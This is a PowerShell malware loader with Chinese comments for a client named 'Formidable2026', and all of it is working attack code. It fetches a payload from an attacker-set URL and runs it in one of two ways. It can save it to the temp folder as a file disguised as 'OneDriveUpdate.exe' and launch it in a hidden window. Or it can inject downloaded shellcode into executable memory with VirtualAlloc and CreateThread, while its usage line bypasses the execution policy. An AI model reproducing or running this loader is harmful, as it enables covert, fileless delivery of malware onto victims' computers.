<#
    PowerShell Web Delivery Loader for Formidable2026
    -----------------------------------------------
    功能: 从指定的 URL 下载并执行 Formidable 客户端。
    支持: 
    1. 下载 EXE 并运行 (Disk Drop)
    2. 下载 ShellCode 并在内存执行 (Fileless, 需要 sRDI 生成的 bin)
    
    使用方法:
    powershell -ExecutionPolicy Bypass -File Loader.ps1
#>

# 配置部分 (攻击者需修改)
$PayloadUrl = "http://127.0.0.1:8080/Client.exe"  # 下载地址
$PayloadType = "EXE"                              # "EXE" 或 "ShellCode"
$DropPath = "$env:TEMP\OneDriveUpdate.exe"        # EXE 落地路径

# ---------------------------------------------------------------------------

function Run-Exe {
    param([string]$Url, [string]$Path)
    
    Write-Host "[*] Downloading EXE from $Url..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $WebClient = New-Object System.Net.WebClient
        $WebClient.DownloadFile($Url, $Path)
        
        Write-Host "[+] Downloaded to $Path"
        Write-Host "[*] Executing..."
        Start-Process -FilePath $Path -WindowStyle Hidden
        Write-Host "[+] Execution started."
    }
    catch {
        Write-Error "[-] Failed: $_"
    }
}

function Run-ShellCode {
    param([string]$Url)
    
    Write-Host "[*] Downloading ShellCode from $Url..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $WebClient = New-Object System.Net.WebClient
        [byte[]]$ShellCode = $WebClient.DownloadData($Url)
        
        Write-Host "[+] Downloaded $( $ShellCode.Length ) bytes."
        
        # 申请内存
        $Win32 = @"
        using System;
        using System.Runtime.InteropServices;
        public class Kernel32 {
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        }
"@
        Add-Type $Win32
        
        $MemSize = $ShellCode.Length
        $ExecMem = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $MemSize, 0x3000, 0x40) # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
        
        if ($ExecMem -eq [IntPtr]::Zero) {
            Write-Error "[-] VirtualAlloc failed."
            return
        }
        
        # 复制数据
        [System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 0, $ExecMem, $MemSize)
        
        # 执行
        Write-Host "[*] Executing in memory..."
        $hThread = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $ExecMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($hThread -eq [IntPtr]::Zero) {
            Write-Error "[-] CreateThread failed."
            return
        }
        
        [Kernel32]::WaitForSingleObject($hThread, 0xFFFFFFFF)
    }
    catch {
        Write-Error "[-] Failed: $_"
    }
}

# 主逻辑
if ($PayloadType -eq "EXE") {
    Run-Exe -Url $PayloadUrl -Path $DropPath
}
elseif ($PayloadType -eq "ShellCode") {
    Run-ShellCode -Url $PayloadUrl
}
else {
    Write-Error "Unknown PayloadType: $PayloadType"
}
